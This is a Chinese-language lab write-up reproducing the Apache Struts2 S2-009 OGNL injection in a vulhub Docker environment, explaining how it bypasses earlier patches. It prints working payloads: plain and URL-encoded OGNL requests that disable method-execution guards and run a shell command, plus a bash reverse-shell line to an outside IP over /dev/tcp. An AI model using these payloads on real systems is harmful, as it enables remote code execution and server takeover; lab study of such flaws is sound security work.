ailx10说：这篇是我2024年9月写的。前面刷过几个 S2 之后，再看 S2-009，我开始能把修补和绕过连着读了。这次先把表达式放进一个值里，再通过另一个参数名去引用它、触发求值，接着验证文件和连接。笔记里记录的不是单纯换了一串字符，而是输入先进入上下文，之后又在哪一步被调用。连空格和加号也得看请求如何解码，不能只按终端里的直觉理解。这样逐个编号对照，比把它们全叫成同一种 OGNL 漏洞更容易记住差别。

历史靶场代码和地址未重跑，以下输出仅反映原作者的记录。请在经授权的隔离环境中验证版本、配置、请求字节和结果。

原实验将表达式放入参数值，再通过另一参数触发求值；具体行为依赖应用配置与版本。

Struts2对s2-003的修复方法是禁止静态方法调用，在s2-005中可直接通过OGNL绕过该限制，对于`#`号，同样使用编码`\u0023`或`\43`进行绕过。Struts2对s2-005的修复方法是禁止`\`等特殊符号，使用户不能提交反斜线，而s2-009则是找到一个action中接受了某个参数`example`，这个参数将进入OGNL的上下文。将OGNL表达式放在`example`参数中，然后使用`/helloword.acton?example=<OGNL statement>&(example)('xxx')=1`的方法来执行它，从而绕过官方对`#`、`\`等特殊字符的防御。

前提：准备好docker环境，下载好vulhub，进入目录 ，开始复现漏洞

- `docker-compose build //可选`
- `docker-compose up -d`

完成试验后，记得删除漏洞环境哦～～

实验结束后在确认项目目录和 Compose 配置后关闭本项目服务；原文中的全局 Docker 清理命令已移除。

（1）命令执行，创建文件

```
age=12313&name=(#context["xwork.MethodAccessor.denyMethodExecution"]= new java.lang.Boolean(false), #_memberAccess["allowStaticMethodAccess"]= new java.lang.Boolean(true), @java.lang.Runtime@getRuntime().exec('touch /tmp/ailx10'))(meh)&z[(name)('meh')]=true
```

- 将`denyMethodExecution`设置为`false`，允许执行某些方法
- 将`allowStaticMethodAccess`设置为`true`，允许静态方法的访问，进一步放宽了安全限制
- 命令执行`touch /tmp/ailx10`会在`/tmp`目录下创建一个名为`ailx10`的空文件

空格与加号的处理取决于请求的编码方式及各层解码规则，不能笼统说命令中的空格绝不能编码为加号。

```
age=12313&name=%28%23context[%22xwork.MethodAccessor.denyMethodExecution%22]%3D+new+java.lang.Boolean%28false%29,%20%23_memberAccess[%22allowStaticMethodAccess%22]%3d+new+java.lang.Boolean%28true%29,%20@java.lang.Runtime@getRuntime%28%29.exec%28%27touch%20/tmp/ailx10%27%29%29%28meh%29&z[%28name%29%28%27meh%27%29]=true
```

（2）命令执行，反弹shell

```
/bin/bash -c bash$IFS$9-i>&/dev/tcp/144.34.162.13/6666<&1
```
